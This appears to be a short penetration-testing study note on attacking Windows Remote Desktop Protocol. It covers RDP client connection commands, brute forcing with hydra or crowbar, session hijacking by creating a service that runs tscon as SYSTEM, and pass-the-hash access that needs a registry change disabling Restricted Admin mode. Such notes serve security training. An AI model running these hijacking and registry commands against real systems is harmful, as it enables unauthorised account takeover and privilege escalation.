- **tags:** #common-services #xfreerdp #RDP #rdesktop
- --------------------
*Remote Desktop Protocol* is a proprietary protocol developed by Microsoft Corporation which provides a user with a graphical interface to connect to another computer over a network connection. The user employs *RDP* client software for this purpose, while the other computer must run *RDP* server software. By *default*, the server listens on TCP *port* **3389** and UDP port 3389. 
# Connection
From a *Linux* host we can use either *rdesktop* or *xfreerdp*:
```bash
rdesktop -u "username" -p "password" <ip>
xfreerdp /u:victor /p:p@ss123 /v:<hostIP>
```
# Brute Force
We can use tools like *hydra* or *crowbar* to perform password spraying or password brute forcing attacks.
# Session Hijacking
If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account.
```shell
# list current active sessions
query user # you need to take note of the session id of the user you'd like to impersonate
```
To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges
```shell
# create a service that will prompt a terminal as the other user
sc create "sessionhijack" binpath="cmd.exe /k tscon <session_id> /dest:rdp-tcp#<your_corresponding_number>"

# start service
net start "sessionhijack"
```
# Pass the Hash
 In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp` with the `pth` switch. **Note:** *Admin Restricted Mode* could have been enabled to mitigate such attacks. In that case we will need to add the following *registry* key-value:
```shell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

